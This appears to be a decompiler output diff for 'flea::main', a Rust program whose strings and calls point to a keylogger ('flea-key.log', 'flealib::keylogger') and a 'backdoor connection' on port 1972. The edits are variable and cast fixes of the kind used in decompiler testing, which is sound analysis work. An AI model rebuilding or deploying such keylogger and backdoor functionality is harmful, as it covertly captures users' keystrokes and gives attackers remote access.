@@ -56,6 +56,7 @@ void flea::main()
     int v53;  // [bp-0x2a8]
     unsigned long long v54;  // [bp-0x298]
     unsigned long long *v55;  // [bp-0x288]
+    char v56;  // [bp-0x280]
     unsigned long long v57;  // [bp-0x280]
     int v58;  // [bp-0x278]
     unsigned long long v59;  // [bp-0x270]
@@ -208,7 +209,7 @@ void flea::main()
     memcpy(&v107, &v29, 16);
     v106 = v28;
     v105 = v27;
-    memcpy(&v104, &v22, 16);
+    memcpy(&v104, &v21, 16);
     memcpy(&v103, &v153, 16);
     memcpy(&v102, &v7, 16);
     v109 = 0;
@@ -359,7 +360,7 @@ LABEL_67b473:
             v53 = v28;
             v132 = *((int128_t *)&v7);
             v52 = v27;
-            memcpy(&v50, &v22, 16);
+            memcpy(&v50, &v21, 16);
             *((int128_t *)&v48) = *((int128_t *)&v153);
             v44 = v132;
             v133 = v46.opt_present("hPrint this help menuError setting Ctrl-C handlerCouldn't get current directory!flea-key.logfailed to spawn thread/root/.rustup/toolchains/nightly-2025-01-01-x86_64-unknown-linux-gnu/lib/rustlib/src/rust/library/std/src/thread/mod.rs", 1);
@@ -399,18 +400,18 @@ LABEL_67b473:
                     ::0x679510::core::ptr::drop_in_place<std::path::PathBuf>(&v1);
                     flealib::keylogger::remove_keylog_file(&v8, &v84);
                     ::0x679550::core::ptr::drop_in_place<alloc::string::String>(&v8);
-                    (char)v57.spec_to_string(&v101);
+                    v56.spec_to_string(&v101);
                     if (v90 != 0x8000000000000000)
                     {
                         v9 = v91;
-                        ::0x679550::core::ptr::drop_in_place<alloc::string::String>(&(char)v57);
+                        ::0x679550::core::ptr::drop_in_place<alloc::string::String>(&v56);
                         v57 = v90;
                         *((int128_t *)&v58) = *((int128_t *)&v8);
                     }
                     v8.to_vec(":1972Starting backdoor connectionRestartsrc/main.rs", 5);
                     v4 = v17;
                     memcpy(&v1, &v8, 16);
-                    (char)v57.append_elements(v3, v116, &g_af5898);
+                    v56.append_elements(v3, v116, &g_af5898);
                     ::0x679550::core::ptr::drop_in_place<alloc::string::String>(&v1);
                     *((unsigned long long *)&v9) = 1;
                     v11 = 1;
